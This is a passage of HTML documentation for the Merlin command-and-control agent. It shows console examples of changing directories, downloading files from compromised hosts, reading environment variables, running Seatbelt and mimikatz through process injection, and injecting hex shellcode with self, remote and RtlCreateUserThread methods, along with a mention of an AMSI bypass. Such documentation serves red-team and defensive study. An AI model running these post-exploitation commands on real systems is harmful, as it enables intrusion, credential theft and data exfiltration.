           &amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;
                   Version: 2.0.0
                   Build: nonRelease
</pre></div>
</div>
</section>
<section id="cd">
<span id="id2"></span><h2>cd<a class="headerlink" href="#cd" title="Link to this heading"></a></h2>
<div class="admonition note">
<p class="admonition-title">Note</p>
<p>USAGE: <code class="docutils literal notranslate"><span class="pre">cd</span> <span class="pre">directory</span></code></p>
</div>
<p>The <code class="docutils literal notranslate"><span class="pre">cd</span></code> command is used to change the current working directory the Merlin agent is using.
Relative paths can be used (e.g.,. <code class="docutils literal notranslate"><span class="pre">./../</span></code> or <code class="docutils literal notranslate"><span class="pre">downloads\\Merlin</span></code>).
This command uses native Go and will not execute the <code class="docutils literal notranslate"><span class="pre">cd</span></code> binary program found on the host operating system.</p>
<div class="line-block">
<div class="line">The <code class="docutils literal notranslate"><span class="pre">\</span></code> in a Windows directory must be escaped like <code class="docutils literal notranslate"><span class="pre">C:\\Windows\\System32</span></code>.</div>
</div>
<div class="highlight-text notranslate"><div class="highlight"><pre><span></span>Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» cd /usr/bin
[-]Created job evtawDqBWa for agent a98e6175-7799-47fb-abf0-32534a9191f0 at 2019-02-27T01:03:57Z
Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» [+]Results for job evtawDqBWa at 2019-02-27T01:03:59Z
Changed working directory to /usr/bin
</pre></div>
</div>
<div class="highlight-text notranslate"><div class="highlight"><pre><span></span>Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» cd &quot;C:\\Program Files (x86)\\&quot;
[-]Created job gwFQhcsKJi for agent c1090dbc-f2f7-4d90-a241-86e0c0217786 at 2019-02-27T01:17:26Z
Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» [+]Results for job gwFQhcsKJi at 2019-02-27T01:17:30Z
Changed working directory to C:\Program Files (x86)
</pre></div>
</div>
</section>
<section id="checkin">
<h2>checkin<a class="headerlink" href="#checkin" title="Link to this heading"></a></h2>
<div class="admonition note">
<p class="admonition-title">Note</p>
<p>USAGE: <code class="docutils literal notranslate"><span class="pre">checkin</span></code></p>
</div>
<p>The <code class="docutils literal notranslate"><span class="pre">checkin</span></code> command will force the agent check in by sending back an <code class="docutils literal notranslate"><span class="pre">AgentInfo</span></code> message.
Useful when a peer-to-peer Agent has a negative sleep value so it only communicates in when it has a message to send.</p>
<div class="highlight-text notranslate"><div class="highlight"><pre><span></span>Merlin[agent][13f6ebee-78ec-4414-a04c-74188b95c01c]» checkin
[-] Created job xLjwJhegfR for agent 13f6ebee-78ec-4414-a04c-74188b95c01c at 2023-08-03T10:58:26Z
[-] Results of job xLjwJhegfR for agent 13f6ebee-78ec-4414-a04c-74188b95c01c at 2023-08-03T10:58:43Z
    Configuration data received for Agent 13f6ebee-78ec-4414-a04c-74188b95c01c and updated. Issue the &quot;info&quot; command to view it.
</pre></div>
</div>
</section>
<section id="clear">
<h2>clear<a class="headerlink" href="#clear" title="Link to this heading"></a></h2>
<div class="admonition note">
<p class="admonition-title">Note</p>
<p>USAGE: <code class="docutils literal notranslate"><span class="pre">clear</span></code></p>
</div>
<p>The <code class="docutils literal notranslate"><span class="pre">clear</span></code> command will cancel all jobs in the queue that have not been sent to the agent yet.
This command will only clear jobs for the current agent.</p>
<div class="highlight-text notranslate"><div class="highlight"><pre><span></span>Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» clear
[+] jobs cleared for agent c1090dbc-f2f7-4d90-a241-86e0c0217786
</pre></div>
</div>
</section>
<section id="connect">
<h2>connect<a class="headerlink" href="#connect" title="Link to this heading"></a></h2>
<div class="admonition note">
<p class="admonition-title">Note</p>
<p>USAGE: <code class="docutils literal notranslate"><span class="pre">connect</span> <span class="pre">uri</span></code></p>
</div>
<p>The <code class="docutils literal notranslate"><span class="pre">connect</span></code> command instruct an Agent to re-connect it’s primary communicate channel to the provide address.</p>
<ul class="simple">
<li><p>HTTP based Agents use a URI like <code class="docutils literal notranslate"><span class="pre">https://127.0.0.1</span></code></p></li>
<li><p>TCP/UDP Agents use a URI like <code class="docutils literal notranslate"><span class="pre">127.0.0.1:7777</span></code></p></li>
<li><p>SMB Beacons use a URI like <code class="docutils literal notranslate"><span class="pre">\\\\127.0.0.1\\pipe\\merlinpipe</span></code> and the backslashes need to be escaped</p></li>
</ul>
<p>Bind Agents will listen on the new interface and reverse Agents will connect to the new uri.
If you get the jobs results back, the Agent has successfully reconnected.</p>
<p>HTTP Agent:</p>
<div class="highlight-text notranslate"><div class="highlight"><pre><span></span>Merlin[agent][b3c03f46-b327-45c1-ac82-71a49032d4ad]» connect https://192.168.22.100/NeverGonnaGiveYouUp
[-] Created job QZnUPPEooZ for agent b3c03f46-b327-45c1-ac82-71a49032d4ad at 2023-08-03T11:04:08Z
[-] Results of job QZnUPPEooZ for agent b3c03f46-b327-45c1-ac82-71a49032d4ad at 2023-08-03T11:04:24Z
    Configuration data received for Agent b3c03f46-b327-45c1-ac82-71a49032d4ad and updated. Issue the &quot;info&quot; command to view it.
</pre></div>
</div>
<p>TCP bind Agent:</p>
<div class="highlight-text notranslate"><div class="highlight"><pre><span></span>Merlin[agent][13f6ebee-78ec-4414-a04c-74188b95c01c]» connect 192.168.31.163:4444
[-] Created job IFDLuKIRHD for agent 13f6ebee-78ec-4414-a04c-74188b95c01c at 2023-08-03T11:09:36Z
Merlin[agent][13f6ebee-78ec-4414-a04c-74188b95c01c]» interact b3c03f46-b327-45c1-ac82-71a49032d4ad
Merlin[agent][b3c03f46-b327-45c1-ac82-71a49032d4ad]» link tcp 192.168.31.163:4444
[-] Created job QeoGIbKQjh for agent b3c03f46-b327-45c1-ac82-71a49032d4ad at 2023-08-03T11:10:43Z
[-] Results of job QeoGIbKQjh for agent b3c03f46-b327-45c1-ac82-71a49032d4ad at 2023-08-03T11:11:04Z
[+] Successfully connected to tcp-bind Agent 13f6ebee-78ec-4414-a04c-74188b95c01c at 192.168.31.163:4444
[-] Results of job IFDLuKIRHD for agent 13f6ebee-78ec-4414-a04c-74188b95c01c at 2023-08-03T11:11:04Z
    Configuration data received for Agent 13f6ebee-78ec-4414-a04c-74188b95c01c and updated. Issue the &quot;info&quot; command to view it.
</pre></div>
</div>
</section>
<section id="debug">
<h2>debug<a class="headerlink" href="#debug" title="Link to this heading"></a></h2>
<div class="admonition note">
<p class="admonition-title">Note</p>
<p>USAGE: <code class="docutils literal notranslate"><span class="pre">debug</span></code></p>
</div>
<p>The <code class="docutils literal notranslate"><span class="pre">debug</span></code> command is a switch used to enable or disable debug output to the console.</p>
<div class="highlight-text notranslate"><div class="highlight"><pre><span></span>Merlin[agent][13f6ebee-78ec-4414-a04c-74188b95c01c]» debug
[+] 2023-10-19T12:16:13Z Debug output enabled
Merlin[agent][13f6ebee-78ec-4414-a04c-74188b95c01c]» debug
[+] 2023-10-19T12:16:15Z Debug output disabled
</pre></div>
</div>
</section>
<section id="download">
<span id="id3"></span><h2>download<a class="headerlink" href="#download" title="Link to this heading"></a></h2>
<div class="admonition note">
<p class="admonition-title">Note</p>
<p>USAGE: <code class="docutils literal notranslate"><span class="pre">download</span> <span class="pre">filePath</span></code></p>
</div>
<p>The <code class="docutils literal notranslate"><span class="pre">download</span></code> command is used to download a file from the host where the agent is running back to the Merlin server.
The file will be automatically saved in a folder with a name of the agent’s identifier in the
<code class="docutils literal notranslate"><span class="pre">data\agents\c1090dbc-f2f7-4d90-a241-86e0c0217786</span></code> directory.</p>
<div class="admonition note">
<p class="admonition-title">Note</p>
<p>Because <code class="docutils literal notranslate"><span class="pre">\</span></code> is used to escape a character, file paths require two (e.g., <code class="docutils literal notranslate"><span class="pre">C:\\Windows</span></code>)</p>
</div>
<div class="admonition note">
<p class="admonition-title">Note</p>
<p>Enclose file paths containing a space with quotation marks (e.g.,. <code class="docutils literal notranslate"><span class="pre">&quot;C:\\Windows\\Program</span> <span class="pre">Files\\&quot;</span></code>)</p>
</div>
<div class="admonition warning">
<p class="admonition-title">Warning</p>
<p>Downloaded files are stored on the Merlin Server, not the place where the Merlin CLI is running.</p>
</div>
<div class="highlight-text notranslate"><div class="highlight"><pre><span></span>Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» download C:\\Windows\\hh.exe
Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» [-]Created job NXnhJVRUSP for agent c1090dbc-f2f7-4d90-a241-86e0c0217786
[+]Results for job NXnhJVRUSP
[+]Successfully downloaded file C:\Windows\hh.exe with a size of 17920 bytes from agent to C:\merlin\data\agents\c1090dbc-f2f7-4d90-a241-86e0c0217786\hh.exe
Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]»
</pre></div>
</div>
</section>
<section id="env">
<h2>env<a class="headerlink" href="#env" title="Link to this heading"></a></h2>
<div class="admonition note">
<p class="admonition-title">Note</p>
<p>USAGE: <code class="docutils literal notranslate"><span class="pre">env</span> <span class="pre">{get|set|showall|unset}</span> <span class="pre">[variable]</span> <span class="pre">[value]</span></code></p>
</div>
<dl class="simple">
<dt>The <code class="docutils literal notranslate"><span class="pre">env</span></code> command is used to interact with environment variables and has the following methods:</dt><dd><ul class="simple">
<li><p><a class="reference internal" href="#get">get</a></p></li>
<li><p><a class="reference internal" href="#env-set"><span class="std std-ref">set</span></a></p></li>
<li><p><a class="reference internal" href="#showall">showall</a></p></li>
<li><p><a class="reference internal" href="#unset">unset</a></p></li>
</ul>
</dd>
</dl>
<section id="get">
<h3>get<a class="headerlink" href="#get" title="Link to this heading"></a></h3>
<div class="admonition note">
<p class="admonition-title">Note</p>
<p>USAGE: <code class="docutils literal notranslate"><span class="pre">env</span> <span class="pre">get</span> <span class="pre">variable</span></code></p>
</div>
<p>The <code class="docutils literal notranslate"><span class="pre">env</span> <span class="pre">get</span></code> command is used to retrieve the value of an existing environment variable.
The third, or last, argument is the name of environment variable to retrieve.</p>
<div class="highlight-text notranslate"><div class="highlight"><pre><span></span>Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» env get TEST1
[-] Created job xaSqAdQBXs for agent c1090dbc-f2f7-4d90-a241-86e0c0217786
[-] Results job xaSqAdQBXs for agent c1090dbc-f2f7-4d90-a241-86e0c0217786

[+]
Environment variable TEST1=TESTINGTEST
</pre></div>
</div>
</section>
<section id="set">
<span id="env-set"></span><h3>set<a class="headerlink" href="#set" title="Link to this heading"></a></h3>
<div class="admonition note">
<p class="admonition-title">Note</p>
<p>USAGE: <code class="docutils literal notranslate"><span class="pre">env</span> <span class="pre">set</span> <span class="pre">variable</span> <span class="pre">value</span></code></p>
</div>
<p>The <code class="docutils literal notranslate"><span class="pre">env</span> <span class="pre">set</span></code> command is used create, or overwrite, an environment variable with the specified value.
The third argument is the name of the environment variable and the fourth argument is the environment variables value.</p>
<div class="highlight-text notranslate"><div class="highlight"><pre><span></span>Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» env set TEST1 TESTINGTEST
[-] Created job NcyukONetb for agent c1090dbc-f2f7-4d90-a241-86e0c0217786
[-] Results job NcyukONetb for agent c1090dbc-f2f7-4d90-a241-86e0c0217786

[+]
Set environment variable: TEST1=TESTINGTEST
</pre></div>
</div>
</section>
<section id="showall">
<h3>showall<a class="headerlink" href="#showall" title="Link to this heading"></a></h3>
<div class="admonition note">
<p class="admonition-title">Note</p>
<p>USAGE: <code class="docutils literal notranslate"><span class="pre">env</span> <span class="pre">showall</span></code></p>
</div>
<p>The <code class="docutils literal notranslate"><span class="pre">env</span> <span class="pre">showall</span></code> command enumerates and return all environment variables:</p>
<div class="highlight-text notranslate"><div class="highlight"><pre><span></span>Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» env showall
[-] Created job NzbQEytJpY for agent c1090dbc-f2f7-4d90-a241-86e0c0217786
[-] Results job NzbQEytJpY for agent c1090dbc-f2f7-4d90-a241-86e0c0217786

[+]
Environment variables:
SHELL=/bin/bash
SESSION_MANAGER=local/ubuntu:@/tmp/.ICE-unix/3195,unix/ubuntu:/tmp/.ICE-unix/3195
QT_ACCESSIBILITY=1
SNAP_REVISION=148
XDG_CONFIG_DIRS=/etc/xdg/xdg-ubuntu:/etc/xdg
XDG_MENU_PREFIX=gnome-
GNOME_DESKTOP_SESSION_ID=this-is-deprecated
SNAP_REAL_HOME=/home/rastley
GNOME_SHELL_SESSION_MODE=ubuntu
SSH_AUTH_SOCK=/run/user/1000/keyring/ssh
</pre></div>
</div>
</section>
<section id="unset">
<h3>unset<a class="headerlink" href="#unset" title="Link to this heading"></a></h3>
<div class="admonition note">
<p class="admonition-title">Note</p>
<p>USAGE: <code class="docutils literal notranslate"><span class="pre">env</span> <span class="pre">unset</span> <span class="pre">variable</span></code></p>
</div>
<p>The <code class="docutils literal notranslate"><span class="pre">env</span> <span class="pre">unset</span></code> command clears, or empties, the environment variable name provided in the third argument:</p>
<div class="highlight-text notranslate"><div class="highlight"><pre><span></span>Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» env unset TEST1
[-] Created job hEYjNYeniT for agent c1090dbc-f2f7-4d90-a241-86e0c0217786
[-] Results job hEYjNYeniT for agent c1090dbc-f2f7-4d90-a241-86e0c0217786

[+]
Unset environment variable: TEST1

Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» env get TEST1
[-] Created job IhKdCrKHEr for agent c1090dbc-f2f7-4d90-a241-86e0c0217786
[-] Results job IhKdCrKHEr for agent c1090dbc-f2f7-4d90-a241-86e0c0217786

[+]
Environment variable TEST1=
</pre></div>
</div>
</section>
</section>
<section id="exit">
<h2>exit<a class="headerlink" href="#exit" title="Link to this heading"></a></h2>
<div class="admonition note">
<p class="admonition-title">Note</p>
<p>USAGE: <code class="docutils literal notranslate"><span class="pre">exit</span> <span class="pre">[-y]</span></code></p>
</div>
<p>The <code class="docutils literal notranslate"><span class="pre">exit</span></code> control type instructs the agent to exit or die.
There is no response on the CLI after the instruction has been provided to the agent.
This is the shortest way to quickly kill an agent.
The command will prompt for confirmation to prevent accidentally exiting the agent.
If you are certain use the <code class="docutils literal notranslate"><span class="pre">-y</span></code> flag to skip confirmation.</p>
<div class="highlight-text notranslate"><div class="highlight"><pre><span></span>Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» exit

are you sure that you want to exit the agent? [yes/NO]:
yes
Merlin»
[-] Created job LHhrzSYuGS for agent c1090dbc-f2f7-4d90-a241-86e0c0217786
</pre></div>
</div>
</section>
<section id="execute-assembly">
<span id="id4"></span><h2>execute-assembly<a class="headerlink" href="#execute-assembly" title="Link to this heading"></a></h2>
<div class="admonition note">
<p class="admonition-title">Note</p>
<p>This command is only available to agent running on a <code class="docutils literal notranslate"><span class="pre">Windows</span></code> operating system!</p>
</div>
<div class="admonition note">
<p class="admonition-title">Note</p>
<p>USAGE: <code class="docutils literal notranslate"><span class="pre">execute-assembly</span> <span class="pre">assemblyPath</span> <span class="pre">[assemblyArguments]</span> <span class="pre">[spawnToPath]</span> <span class="pre">[spawnToArguments]</span></code></p>
</div>
<p>The <code class="docutils literal notranslate"><span class="pre">execute-assembly</span></code> command uses <a class="reference external" href="https://github.com/Binject/go-donut">go-donut</a> to convert a .NET assembly into
shellcode and then uses the <code class="docutils literal notranslate"><span class="pre">windows/x64/go/exec/createProcess</span></code> Merlin module to execute the shellcode.</p>
<p>Currently this command only supports .NET v4.0 assemblies. For more granular control, use the <code class="docutils literal notranslate"><span class="pre">windows/x64/go/exec/donut</span></code> module.</p>
<p>The command requires the file path to the assembly you wish to execute in the <code class="docutils literal notranslate"><span class="pre">&lt;assembly</span> <span class="pre">path&gt;</span></code> argument.
All other arguments are optional. The <code class="docutils literal notranslate"><span class="pre">&lt;spawnto</span> <span class="pre">path&gt;</span></code> argument is the process that will be started on the target and
where the shellcode will be injected and executed.
If a <code class="docutils literal notranslate"><span class="pre">&lt;spawnto</span> <span class="pre">path&gt;</span></code> is not provided, <code class="docutils literal notranslate"><span class="pre">C:\WIndows\System32\dllhost.exe</span></code> will be used.
The <code class="docutils literal notranslate"><span class="pre">&lt;spawnto</span> <span class="pre">args&gt;</span></code> value is used as an argument when starting the spawnto process.</p>
<div class="admonition note">
<p class="admonition-title">Note</p>
<p>Because <code class="docutils literal notranslate"><span class="pre">\</span></code> is used to escape a character, file paths require two (e.g., <code class="docutils literal notranslate"><span class="pre">C:\\Windows</span></code>)</p>
</div>
<div class="admonition note">
<p class="admonition-title">Note</p>
<p>Use quotes to enclose multiple arguments for <code class="docutils literal notranslate"><span class="pre">&lt;assembly</span> <span class="pre">args&gt;</span></code> (e.g., <code class="docutils literal notranslate"><span class="pre">execute-assembly</span> <span class="pre">Seatbelt.exe</span> <span class="pre">&quot;LocalGroups</span> <span class="pre">LocalUsers&quot;</span></code>)</p>
</div>
<div class="highlight-text notranslate"><div class="highlight"><pre><span></span>Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» execute-assembly Seatbelt.exe &quot;DotNet IdleTime&quot; &quot;C:\\Windows\\System32\\WerFault.exe&quot; /?
Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]»
[-] Created job dmAfzDPUsM for agent c1090dbc-f2f7-4d90-a241-86e0c0217786


[+] Results for c1090dbc-f2f7-4d90-a241-86e0c0217786 job dmAfzDPUsM



                        %&amp;&amp;@@@&amp;&amp;
                        &amp;&amp;&amp;&amp;&amp;&amp;&amp;%%%,                       #&amp;&amp;@@@@@@%%%%%%###############%
                        &amp;%&amp;   %&amp;%%                        &amp;////(((&amp;%%%%%#%################//((((###%%%%%%%%%%%%%%%
%%%%%%%%%%%######%%%#%%####%  &amp;%%**#                      @////(((&amp;%%%%%%######################(((((((((((((((((((
#%#%%%%%%%#######%#%%#######  %&amp;%,,,,,,,,,,,,,,,,         @////(((&amp;%%%%%#%#####################(((((((((((((((((((
#%#%%%%%%#####%%#%#%%#######  %%%,,,,,,  ,,.   ,,         @////(((&amp;%%%%%%%######################(#(((#(#((((((((((
#####%%%####################  &amp;%%......  ...   ..         @////(((&amp;%%%%%%%###############%######((#(#(####((((((((
#######%##########%#########  %%%......  ...   ..         @////(((&amp;%%%%%#########################(#(#######((#####
###%##%%####################  &amp;%%...............          @////(((&amp;%%%%%%%%##############%#######(#########((#####
#####%######################  %%%..                       @////(((&amp;%%%%%%%################
                        &amp;%&amp;   %%%%%      Seatbelt         %////(((&amp;%%%%%%%%#############*
                        &amp;%%&amp;&amp;&amp;%%%%%        v1.1.0         ,(((&amp;%%%%%%%%%%%%%%%%%,
                         #%%%%##,


====== DotNet ======

  Installed CLR Versions
      2.0.50727
      4.0.30319

  Installed .NET Versions
      3.5.30729.4926
      4.8.03752

  Anti-Malware Scan Interface (AMSI)
      OS supports AMSI           : True
     .NET version support AMSI   : True
        [!] The highest .NET version is enrolled in AMSI!
        [*] You can invoke .NET version 3.5 to bypass AMSI.
====== IdleTime ======

  CurrentUser : DESKTOP-H35RK21\rastley
  Idletime    : 00h:06m:02s:766ms (362766 milliseconds)



[*] Completed collection in 0.122 seconds
</pre></div>
</div>
</section>
<section id="execute-pe">
<span id="id5"></span><h2>execute-pe<a class="headerlink" href="#execute-pe" title="Link to this heading"></a></h2>
<div class="admonition note">
<p class="admonition-title">Note</p>
<p>This command is only available to agent running on a <code class="docutils literal notranslate"><span class="pre">Windows</span></code> operating system!</p>
</div>
<div class="admonition note">
<p class="admonition-title">Note</p>
<p>USAGE: <code class="docutils literal notranslate"><span class="pre">execute-pe</span> <span class="pre">peFilePath</span> <span class="pre">[peArgumentes]</span> <span class="pre">[spawnToPath]</span> <span class="pre">[spawnToArguments]</span></code></p>
</div>
<p>The <code class="docutils literal notranslate"><span class="pre">execute-pe</span></code> command uses <a class="reference external" href="https://github.com/Binject/go-donut">go-donut</a> to convert a Windows Portable
Executable (PE), commonly an .exe, into shellcode and then uses the <code class="docutils literal notranslate"><span class="pre">windows/x64/go/exec/createProcess</span></code> Merlin module
to execute the shellcode.</p>
<p>The command requires the file path to the PE you wish to execute in the <code class="docutils literal notranslate"><span class="pre">&lt;pe</span> <span class="pre">path&gt;</span></code> argument.
All other arguments are optional. The <code class="docutils literal notranslate"><span class="pre">&lt;spawnto</span> <span class="pre">path&gt;</span></code> argument is the process that will be started on the target and
where the shellcode will be injected and executed. If a <code class="docutils literal notranslate"><span class="pre">&lt;spawnto</span> <span class="pre">path&gt;</span></code> is not provided,
<code class="docutils literal notranslate"><span class="pre">C:\WIndows\System32\dllhost.exe</span></code> will be used. The <code class="docutils literal notranslate"><span class="pre">&lt;spawnto</span> <span class="pre">args&gt;</span></code> value is used as an argument when starting the
spawnto process.</p>
<div class="admonition note">
<p class="admonition-title">Note</p>
<p>Because <code class="docutils literal notranslate"><span class="pre">\</span></code> is used to escape a character, file paths require two (e.g., <code class="docutils literal notranslate"><span class="pre">C:\\Windows</span></code>)</p>
</div>
<div class="admonition note">
<p class="admonition-title">Note</p>
<p>Use quotes to enclose multiple arguments for <code class="docutils literal notranslate"><span class="pre">&lt;pe</span> <span class="pre">args&gt;</span></code> (e.g., <code class="docutils literal notranslate"><span class="pre">execute-pe</span> <span class="pre">mimikatz.exe</span> <span class="pre">&quot;coffee</span> <span class="pre">exit&quot;</span></code>)</p>
</div>
<div class="highlight-text notranslate"><div class="highlight"><pre><span></span>Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» execute-pe mimikatz.exe &quot;coffee exit&quot; C:\\Windows\\System32\\WerFault.exe Testing
Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]»
[-] Created job BSvJZFvbRZ for agent c1090dbc-f2f7-4d90-a241-86e0c0217786


[+] Results for c1090dbc-f2f7-4d90-a241-86e0c0217786 job BSvJZFvbRZ


  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 18 2020 19:18:29
 .## ^ ##.  &quot;A La Vie, A L&#39;Amour&quot; - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       &gt; https://blog.gentilkiwi.com/mimikatz
 &#39;## v ##&#39;       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  &#39;#####&#39;        &gt; https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz(commandline) # coffee

    ( (
     ) )
  .______.
  |      |]
  \      /
   `----&#39;

mimikatz(commandline) # exit
Bye!
</pre></div>
</div>
</section>
<section id="execute-shellcode">
<span id="id7"></span><h2>execute-shellcode<a class="headerlink" href="#execute-shellcode" title="Link to this heading"></a></h2>
<div class="admonition note">
<p class="admonition-title">Note</p>
<p>This command is only available to agent running on a <code class="docutils literal notranslate"><span class="pre">Windows</span></code> operating system!</p>
</div>
<div class="admonition note">
<p class="admonition-title">Note</p>
<p>USAGE: <code class="docutils literal notranslate"><span class="pre">execute-shellcode</span> <span class="pre">{self|remote|RtlCreateUserThread|UserAPC}</span> <span class="pre">[PID]</span> <span class="pre">{shellcode</span> <span class="pre">|</span> <span class="pre">shellcodeFilePath}</span></code></p>
</div>
<p>The <code class="docutils literal notranslate"><span class="pre">execute-shellcode</span></code> command is used to have the Agent execute the provided shellcode. This command became available in version <code class="docutils literal notranslate"><span class="pre">0.6.4</span></code> and is only supported for Windows agents.</p>
<p>The <code class="docutils literal notranslate"><span class="pre">execute-shellcode</span></code> command takes the shellcode you want to execute at the last argument.
Shellcode can be provided using an absolute filepath or by pasting it directly into the terminal in one of the following
formats:</p>
<ul class="simple">
<li><p>Hex (e.g., <code class="docutils literal notranslate"><span class="pre">5051525356</span></code>)</p></li>
<li><p><code class="docutils literal notranslate"><span class="pre">0x50,</span> <span class="pre">0x51,</span> <span class="pre">0x52,</span> <span class="pre">0x53,</span> <span class="pre">0x56</span></code> with or without spaces and commas</p></li>
<li><p><code class="docutils literal notranslate"><span class="pre">\x50\x51\x52\x53\x56</span></code></p></li>
<li><p>Base64 encoded version of the above formats</p></li>
<li><p>A file containing any of the above formats or just a raw byte file</p></li>
</ul>
<div class="admonition warning">
<p class="admonition-title">Warning</p>
<p>Shellcode injection and execution could cause a process to crash so choose wisely</p>
</div>
<div class="admonition note">
<p class="admonition-title">Note</p>
<p>If Cobalt Strike’s Beacon is injected using one of these methods, exiting the Beacon will cause the process to die too.</p>
</div>
<dl class="simple">
<dt>The agent can execute shellcode using one of the following methods:</dt><dd><ul class="simple">
<li><p><a class="reference internal" href="#self">self</a></p></li>
<li><p><a class="reference internal" href="#remote">remote</a></p></li>
<li><p><a class="reference internal" href="#rtlcreateuserthread">RtlCreateUserThread</a></p></li>
<li><p><a class="reference internal" href="#userapc">UserAPC</a></p></li>
</ul>
</dd>
</dl>
<section id="self">
<span id="id8"></span><h3>self<a class="headerlink" href="#self" title="Link to this heading"></a></h3>
<div class="admonition note">
<p class="admonition-title">Note</p>
<p>USAGE: <code class="docutils literal notranslate"><span class="pre">execute-shellcode</span> <span class="pre">self</span> <span class="pre">SHELLCODE</span></code></p>
</div>
<p>The <code class="docutils literal notranslate"><span class="pre">self</span></code> method allocates space within the Merlin Agent process and executes the shellcode.</p>
<div class="highlight-text notranslate"><div class="highlight"><pre><span></span>Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» execute-shellcode self 505152535657556A605A6863616C6354594883EC2865488B32488B7618488B761048AD488B30488B7E3003573C8B5C17288B741F204801FE8B541F240FB72C178D5202AD813C0757696E4575EF8B741F1C4801FE8B34AE4801F799FFD74883C4305D5F5E5B5A5958C3
[-]Created job joQNJONrEK for agent c1090dbc-f2f7-4d90-a241-86e0c0217786
Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» [+]Results for job joQNJONrEK
[+]Shellcode executed successfully
</pre></div>
</div>
</section>
<section id="remote">
<h3>remote<a class="headerlink" href="#remote" title="Link to this heading"></a></h3>
<div class="admonition note">
<p class="admonition-title">Note</p>
<p>USAGE: <code class="docutils literal notranslate"><span class="pre">execute-shellcode</span> <span class="pre">remote</span> <span class="pre">PID</span> <span class="pre">SHELLCODE</span></code></p>
</div>
<p>The <code class="docutils literal notranslate"><span class="pre">remote</span></code> method creates a thread in another process using the
<a class="reference external" href="https://docs.microsoft.com/en-us/windows/desktop/api/processthreadsapi/nf-processthreadsapi-createremotethreadex">CreateRemoteThreadEx</a>
Windows API call.</p>
<div class="highlight-text notranslate"><div class="highlight"><pre><span></span>Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» execute-shellcode remote 6560 0x50, 0x51, 0x52, 0x53, 0x56, 0x57, 0x55, 0x6A, 0x60, 0x5A, 0x68, 0x63, 0x61, 0x6C, 0x63, 0x54, 0x59, 0x48, 0x83, 0xEC, 0x28, 0x65, 0x48, 0x8B, 0x32, 0x48, 0x8B, 0x76, 0x18, 0x48, 0x8B, 0x76, 0x10, 0x48, 0xAD, 0x48, 0x8B, 0x30, 0x48, 0x8B, 0x7E, 0x30, 0x03, 0x57, 0x3C, 0x8B, 0x5C, 0x17, 0x28, 0x8B, 0x74, 0x1F, 0x20, 0x48, 0x01, 0xFE, 0x8B, 0x54, 0x1F, 0x24, 0x0F, 0xB7, 0x2C, 0x17, 0x8D, 0x52, 0x02, 0xAD, 0x81, 0x3C, 0x07, 0x57, 0x69, 0x6E, 0x45, 0x75, 0xEF, 0x8B, 0x74, 0x1F, 0x1C, 0x48, 0x01, 0xFE, 0x8B, 0x34, 0xAE, 0x48, 0x01, 0xF7, 0x99, 0xFF, 0xD7, 0x48, 0x83, 0xC4, 0x30, 0x5D, 0x5F, 0x5E, 0x5B, 0x5A, 0x59, 0x58, 0xC3
[-]Created job PRumZQYBFR for agent c1090dbc-f2f7-4d90-a241-86e0c0217786
Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» [+]Results for job PRumZQYBFR
[+]Shellcode executed successfully
</pre></div>
</div>
</section>
<section id="rtlcreateuserthread">
<span id="id9"></span><h3>RtlCreateUserThread<a class="headerlink" href="#rtlcreateuserthread" title="Link to this heading"></a></h3>
<div class="admonition note">
<p class="admonition-title">Note</p>
<p>USAGE: <code class="docutils literal notranslate"><span class="pre">execute-shellcode</span> <span class="pre">rtlcreateuserthread</span> <span class="pre">PID</span> <span class="pre">SHELLCODE</span></code></p>
</div>
<p>The <code class="docutils literal notranslate"><span class="pre">rtlcreateuserthread</span></code> method creates a thread in another process using the undocumented
<a class="reference external" href="http://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FExecutable%20Images%2FRtlCreateUserThread.html">RtlCreateUserThread</a>
Windows API call.</p>
<p>Example:</p>
<div class="highlight-text notranslate"><div class="highlight"><pre><span></span>Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» execute-shellcode RtlCreateUserThread 6560 \x50\x51\x52\x53\x56\x57\x55\x6A\x60\x5A\x68\x63\x61\x6C\x63\x54\x59\x48\x83\xEC\x28\x65\x48\x8B\x32\x48\x8B\x76\x18\x48\x8B\x76\x10\x48\xAD\x48\x8B\x30\x48\x8B\x7E\x30\x03\x57\x3C\x8B\x5C\x17\x28\x8B\x74\x1F\x20\x48\x01\xFE\x8B\x54\x1F\x24\x0F\xB7\x2C\x17\x8D\x52\x02\xAD\x81\x3C\x07\x57\x69\x6E\x45\x75\xEF\x8B\x74\x1F\x1C\x48\x01\xFE\x8B\x34\xAE\x48\x01\xF7\x99\xFF\xD7\x48\x83\xC4\x30\x5D\x5F\x5E\x5B\x5A\x59\x58\xC3
